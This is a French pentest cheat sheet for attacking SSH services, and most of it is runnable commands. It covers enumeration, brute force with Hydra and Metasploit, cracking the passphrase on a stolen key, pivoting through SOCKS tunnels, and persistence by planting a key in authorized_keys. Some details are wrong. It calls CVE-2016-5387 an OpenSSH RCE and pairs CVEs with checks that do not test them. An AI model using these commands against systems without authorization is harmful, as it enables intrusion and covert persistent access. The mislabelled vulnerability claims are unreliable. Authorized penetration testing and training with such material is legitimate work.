# SSH (22/TCP)

Secure Shell (SSH) est un protocole cryptographique pour l'administration sécurisée à distance.

## 🔍 Énumération

### Scan de base
```bash
# Scan SSH avec Nmap
sudo nmap -sV -p 22 $IP

# Vérification des algorithmes de chiffrement supportés
nmap --script ssh2-enum-algos -p 22 $IP

# Énumération des clés SSH
nmap --script ssh-hostkey -p 22 $IP
```

### Vérification de la version
```bash
# Récupération de la bannière SSH
nc -vn $IP 22

# Version scan avec netexec
nxc ssh $IP --gen-relay-list ssh_targets.txt
```

## 🔨 Exploitation

### Attaque par bruteforce
```bash
# Avec Hydra
hydra -l [user] -P /usr/share/wordlists/rockyou.txt $IP ssh

# Avec Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Exploitation des clés privées
```bash
# Si vous trouvez une clé privée SSH
chmod 600 id_rsa
ssh -i id_rsa [user]@$IP

# Si la clé est protégée par passphrase
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Vulnérabilités spécifiques
```bash
# Test pour CVE-2016-5387 (OpenSSH RCE)
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 $IP

# Test pour CVE-2016-0777 (OpenSSH Client Bug)
ssh -vvv -oHostKeyAlgorithms=+ssh-dss $IP
```

## 🔐 Post-exploitation

### Pivot via tunnel SSH
```bash
# Créer un tunnel SOCKS proxy
ssh -D 9050 [user]@$IP

# Configurer proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT -P0 [INTERNAL_IP]
```

### Transfert de port
```bash
# Local port forwarding (accéder à un service distant localement)
ssh -L 8080:localhost:80 [user]@$IP

# Remote port forwarding (exposer un service local sur la machine distante)
ssh -R 8080:localhost:80 [user]@$IP
```

### Configuration de persistance
```bash
# Ajout de clé SSH dans authorized_keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3Nz..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

## ⚠️ Erreurs courantes & astuces
- SSH peut être configuré pour rejeter les connexions après plusieurs échecs
- Certaines configurations n'autorisent que l'authentification par clé (no password)
- Vérifiez `/etc/ssh/sshd_config` pour les restrictions
- Utilisez `-vvv` pour déboguer les problèmes de connexion